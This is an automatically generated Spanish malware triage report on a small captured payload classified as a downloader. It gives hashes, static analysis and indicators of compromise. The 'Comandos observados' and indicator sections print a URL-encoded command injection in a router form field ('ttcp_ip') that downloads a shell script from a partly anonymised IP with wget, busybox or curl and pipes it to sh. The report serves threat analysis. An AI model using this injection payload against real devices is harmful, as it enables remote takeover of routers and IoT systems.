# 🧬 Payload Analysis

`c91b5bf43aaa70c0b7568511e039a995c58ee753119edf7ac65318d25d624d2b`

## 📌 Resumen

Texto ASCII de 299 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `sh -s lunblk`
2. `busybox wget hxxp://91.92.40.XXX/wget.sh -O-`
3. `curl hxxp://91.92.40.XXX/wget.sh`
4. `wget hxxp://91.92.40.XXX/wget.sh -O-`
5. `busybox wget hxxp://91[.]92[.]` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Perfil técnico:** `Linux / BusyBox`, compatible con sistemas embebidos o IoT. BusyBox se trata como indicio de plataforma y no como prueba suficiente de que el dispositivo sea IoT. **Ficha malware:** [malware-like/oraculo/downloader/c91b5bf43aaa70c0b7568511e039a995c58ee753119edf7ac65318d25d624d2b.md](../../../../../malware-like/oraculo/downloader/c91b5bf43aaa70c0b7568511e039a995c58ee753119edf7ac65318d25d624d2b.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:49:46.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `c91b5bf43aaa70c0b7568511e039a995c58ee753119edf7ac65318d25d624d2b`
- **SHA1:** `0fa1037426ab6a0bedbabffc3cdf307af80989cc`
- **MD5:** `cb5dbf8c2068757acdd0c3cc4fbcf859`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 299 B |
| Entropía | 5.05 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with no line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
ttcp_ip=-h%20%60cd%20/tmp%3Bwget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20lunblk%3Bbusybox%20wget%20http://91.92.
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20lunblk%3Bbusybox%20wget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20lunblk%3Bcurl%20http://91.92.40.XXX/wget.sh%7Csh%20-s%20lunblk%60&submit_button=&change_action=&action=&commit=0&ttcp_num=2&ttcp_size=2&StartEPI=1 | strings |
| ip | 91.92.40.XXX | static_analysis |
| command | ttcp_ip=-h%20%60cd%20/tmp%3Bwget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20lunblk%3Bbusybox%20wget%20http://91.92. | strings |
| hash | c91b5bf43aaa70c0b7568511e039a995c58ee753119edf7ac65318d25d624d2b | static_analysis |
| ip | 45.156.87.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
